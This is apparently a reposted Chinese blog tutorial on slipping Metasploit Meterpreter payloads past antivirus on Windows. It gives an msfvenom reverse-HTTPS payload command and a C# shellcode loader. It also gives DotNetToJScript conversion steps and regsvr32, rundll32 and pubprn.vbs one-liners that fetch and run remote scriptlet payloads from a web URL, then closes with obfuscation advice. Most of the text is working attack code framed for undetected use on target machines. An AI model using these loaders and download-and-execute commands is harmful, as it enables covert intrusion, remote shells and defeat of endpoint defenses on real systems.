+++
title = "免杀 MSF Windows Payload 的方法与实践"
author = "Hzllaga"
date = 2018-08-07
categories = [ "转载" ]
tags = ["免杀","Payload","shellcode","Metasploit"]

+++
MSF 已经是广为人知的非常流行的渗透平台，没有之一。而作为专注于后渗透的我，最常用的也是 MSF 强大的后渗透功能。在实战当中，经常需要在目标环境中获取一个 Meterpreter 的 shell。那么我面临的第一个问题，就是如何安安稳稳地、神不知鬼不觉地在目标环境中执行 Meterpreter 的 Payload。目前网上流行的免杀和隐蔽执行的思路有很多，今天我给大家介绍一下我屡试不爽的猥琐流方法。 <!--more-->
## 准备 Payload
这个过程比较简单，大多数人应该都会。我们这里使用 msfvenom 生成一个 x86 的 Meterpreter 的 Payload 为例，直接上命令： 
{{< highlight shell >}}
msfvenom  -p windows/meterpreter/reverse_https -a x86 -f csharp --platform windows -o https.csharp -b "\x00\xff" LHOST=192.168.1.222 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe
{{< /highlight >}}
大部分参数都不用过多解释了，常用 MSF 的人都知道。需要说明的是，我们要借助于 C# 来执行生成的 Payload，所以格式要选择为 csharp，而最后两个参数（PrependMigrate 和 PrependMigrateProc）是指明 Payload 执行后要将自己注入到一个新创建的宿主 svchost.exe 进程中去。 生成的结果如下图（cat 命令显示的结果有问题，不用管它）：![](https://cdn.wtfsec.org/img/20200222165439.png)

## 准备 C# 工程
我们需要创建一个 C# 工程，我这里使用 Visual Studio 2017。新建一个空白的 C# 的 Console 工程，.Net Framework 版本选择 2.0（保证兼容性）。 将如下代码黏贴覆盖到 Program.cs 中： 
{{< highlight csharp >}}
using System;
using System.Threading;
using System.Runtime.InteropServices;
namespace MSFWrapper
{
    public class Program
    {
        public Program()
        {
           RunMSF();
        }
        public static void RunMSF()
        {
            byte[] MsfPayload = {
            //Paste your Payload here
        };
            IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40);
            Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length);
            CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0);
            Thread.Sleep(2000);
        }
        public static void Main()
        {
        }
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    }
}
{{< /highlight >}}
然后将先前生成的 Payload 的黏贴到代码中注释为“//Paste your Payload here”的地方。保存代码后，修改该工程的属性，将输出类型改为“Windows 应用程序”，启动对象改为“MSFWrapper.Program”, 然后保存。 增加 Release 版的 x86 编译对象，然后生成出 MSFWrapper.exe。 
## 转换 MSFWrapper.exe 为 js 文件
这里要用到一个非常流弊的工具 DotNetToJScript，这是一款可以将 .net 程序转换为 jscript 代码的。工具下载地址：[Github](https://github.com/tyranid/DotNetToJScript)
使用如下命令进行转换： 
{{< highlight shell >}}
DotNetToJScript.exe -l=JScript -o=MSFWrapper.js -c=MSFWrapper.Program MSFWrapper.exe
{{< /highlight >}}
然后我们就可以用下面的命令执行我们的 MSF Payload： 
{{< highlight shell >}}
C:\windows\SysWOW64\cscript.exe /e:JScript MSFWrapper.js
{{< /highlight >}}
这里一定要注意，因为我们生成的 Payload 跟 exe 都是 32 位的，所以这里也要用 32 的 cscript.exe 去执行。切记！
## 进一步猥琐化
sct 大法 既然能够转换为 js 代码，那么我们自然会想到 sct 大法的应用。我们将转换后的 js 代码黏贴到下面代码中的“//paste code here”： 
{{< highlight xml >}}
<?XML version="1.0"?>
<scriptlet>
<registration 
    progid="Msf"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
    <script language="JScript">
    //paste code here
    </script>
</registration>
</scriptlet>
{{< /highlight >}}
保存为 msf.sct（后缀名可以更改，比如 jpg 等）并上传至 Web Server 然后在目标机器上执行如下命令： 
{{< highlight shell >}}
c:\windows\SysWOW64\regsvr32 /s /u /n /i:https://raw.githubusercontent.com/Moriarty2016/Screenshots/master/msf.sct c:\windows\SysWOW64\scrobj.dll''
{{< /highlight >}}
Bingo！ 另外，我们也可以使用 script 或者 scriptlet 的方式来深度利用，这里我们要使用 DotNetToJSCript.exe 的 -m 参数来生成 scriptlet 文件，命令如下： 
{{< highlight shell >}}
DotNetToJScript.exe -m -o=msf2.sct -c=MSFWrapper.Program MSFWrapper.exe
{{< /highlight >}}
将 msf2.sct 文件上传到 Web Server 上，然后用如下命令在目标环境中执行： 
{{< highlight shell >}}
c:\windows\syswow64\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/Moriarty2016/Screenshots/master/msf2.sct");this.close()
{{< /highlight >}}
Bingo!Bingo! 当然，如果目标环境是 Windows 7 以上版本，还可以这样： 
{{< highlight shell >}}
c:\windows\SysWOW64\cscript.exe c:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/Moriarty2016/Screenshots/master/msf2.sct
{{< /highlight >}}
Bingo!Bingo!Bingo! 

## 关于深度免杀
一般情况下按照上述方法，基本就可以免杀了。如果还有特殊要求的话，可以考虑做如下的额外工作： 考虑对 MSF 生成的 Payload 用 MSF 自带的编码器进行编码，或者自己自定义方式去编码。 然后 base64 编码后，放入 C# 代码中。 生成的 js 代码可以进行模糊编码处理。 总之，一旦将二进制的东西变成脚本之后，免杀起来就会非常的简单！自己去发挥吧！ 